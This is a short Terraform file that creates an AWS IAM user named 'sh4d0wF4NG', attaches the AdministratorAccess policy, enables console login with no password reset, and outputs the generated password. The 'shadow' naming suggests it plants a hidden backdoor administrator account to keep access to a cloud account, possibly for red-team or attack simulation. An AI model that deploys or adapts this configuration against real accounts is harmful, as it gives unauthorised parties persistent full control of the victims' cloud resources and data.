variable "username" {
  type = list(string)
  default = ["sh4d0wF4NG"
  ]
}

resource "aws_iam_user" "iam_account" {
  count = "${length(var.username)}"
  name = "${element(var.username,count.index)}"
  force_destroy = true
}

resource "aws_iam_user_policy_attachment" "adm_policy" {
  user = "${aws_iam_user.iam_account[0].name}"
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

resource "aws_iam_user_login_profile" "shadow_user_profile" {
  user = aws_iam_user.iam_account[0].name
  password_reset_required = false
}

output "shadow-password" {
  value = aws_iam_user_login_profile.shadow_user_profile.password
}
